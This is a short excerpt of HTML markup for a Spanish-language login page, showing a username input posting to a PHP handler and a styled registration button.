...
<body>
    ...
    <form action="process/goat.php" method="POST">
        <center>
            <input type="text" name="user" id="txtUsuario" placeholder="Nombre de usuario"
                style="width:80%; padding-left:30px; height:40px; border:none; border-bottom:1px solid gray; font-size:17px;"
                required>
            <br><br><br><br>
    ...
    <center><input type="button" value="Regístrate aquí"
            style="width:90%; height:45px; border-radius:5px; background-color:white; color:red; border:1px solid red;">
    </center>
</body>
